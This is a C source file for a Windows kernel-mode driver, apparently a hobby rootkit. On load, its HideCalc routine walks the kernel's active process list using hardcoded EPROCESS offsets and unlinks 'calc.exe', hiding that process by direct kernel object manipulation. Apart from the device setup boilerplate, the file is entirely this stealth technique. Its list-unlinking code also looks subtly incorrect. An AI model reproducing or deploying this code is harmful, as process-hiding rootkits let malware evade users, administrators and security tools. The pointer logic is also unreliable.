#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook"

#define MAX_ITER 100

VOID HideCalc() {
	PEPROCESS pEprocessCurrent;
	PLIST_ENTRY pLcCurrent;
	PLIST_ENTRY pLcBuffer;
	int count;
	
	pEprocessCurrent = IoGetCurrentProcess();
  // RE : 0x0b8 plist offset - 0x16c name offset 
	pLcCurrent = pLcBuffer = (PLIST_ENTRY) ((PUCHAR) pEprocessCurrent + 0x0b8);
	count = 0;
	
	while(count < MAX_ITER){
		if( ! strncmp("calc.exe",(PUCHAR)pLcCurrent - 0x0b8 + 0x16c, 13) ){
			DbgPrint("d01n_3vl");
			pLcBuffer->Flink->Blink = pLcCurrent->Blink;
			// Link the next element backlink to the current element backlink
			pLcCurrent->Flink->Blink = pLcCurrent->Blink;
			// Unlink the current process fom the list
			pLcCurrent->Flink = pLcCurrent;
			pLcCurrent->Blink = pLcCurrent;
			break;
		}
		pLcBuffer = pLcCurrent;
		pLcCurrent = pLcCurrent->Flink;
		count += 1;
	}
} 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;
	
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	HideCalc();
	
	pDriverObject->DriverUnload=DriverUnload;
	
	return STATUS_SUCCESS;	
}
